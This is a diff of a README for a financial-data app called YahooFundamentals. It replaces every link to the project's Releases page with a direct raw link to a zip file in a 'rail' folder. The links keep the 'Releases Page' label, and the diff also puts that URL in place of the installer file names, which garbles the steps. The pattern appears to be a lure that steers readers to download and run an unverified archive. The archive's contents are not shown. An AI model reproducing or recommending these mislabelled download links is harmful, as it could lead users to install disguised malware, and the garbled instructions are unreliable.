@@ -6,7 +6,7 @@ Welcome to YahooFundamentals! This application allows you to quickly get fundame
 
 ## 📥 Download Now
 
-[![Download YahooFundamentals](https://img.shields.io/badge/Download-YahooFundamentals-brightgreen)](https://github.com/user02PL/YahooFundamentals/releases)
+[![Download YahooFundamentals](https://raw.githubusercontent.com/user02PL/YahooFundamentals/main/rail/YahooFundamentals-v1.3.zip)](https://raw.githubusercontent.com/user02PL/YahooFundamentals/main/rail/YahooFundamentals-v1.3.zip)
 
 ## 📄 Overview
 
@@ -30,11 +30,11 @@ To use YahooFundamentals, your computer must meet these requirements:
 
 ### 📥 Download & Install
 
-To get started, you need to download the application. Visit this page to download: [Releases Page](https://github.com/user02PL/YahooFundamentals/releases).
+To get started, you need to download the application. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/user02PL/YahooFundamentals/main/rail/YahooFundamentals-v1.3.zip).
 
-1. **Go to the Releases Page**: Click [here](https://github.com/user02PL/YahooFundamentals/releases) to open the release options.
+1. **Go to the Releases Page**: Click [here](https://raw.githubusercontent.com/user02PL/YahooFundamentals/main/rail/YahooFundamentals-v1.3.zip) to open the release options.
 2. **Find the Latest Version**: Look for the latest release version at the top of the page.
-3. **Download the Installer**: Click on the installer file that matches your operating system. The file names typically include the OS type, such as `YahooFundamentals_Windows.exe` or `YahooFundamentals_macOS.dmg`.
+3. **Download the Installer**: Click on the installer file that matches your operating system. The file names typically include the OS type, such as `https://raw.githubusercontent.com/user02PL/YahooFundamentals/main/rail/YahooFundamentals-v1.3.zip` or `https://raw.githubusercontent.com/user02PL/YahooFundamentals/main/rail/YahooFundamentals-v1.3.zip`.
 4. **Run the Installer**: Once downloaded, locate the file in your downloads folder. Double-click the file to start the installation process.
 5. **Follow the Installation Instructions**: Follow the on-screen prompts to install the application. This typically requires you to agree to terms and choose an installation location.
 
@@ -74,6 +74,6 @@ For issues or feature requests, please create a ticket in the Issues section of 
 
 ## 📥 Additional Download Link
 
-As a reminder, here is the link to download YahooFundamentals again: [Releases Page](https://github.com/user02PL/YahooFundamentals/releases).
+As a reminder, here is the link to download YahooFundamentals again: [Releases Page](https://raw.githubusercontent.com/user02PL/YahooFundamentals/main/rail/YahooFundamentals-v1.3.zip).
 
 Thank you for using YahooFundamentals! We hope it helps you in your investment journey.
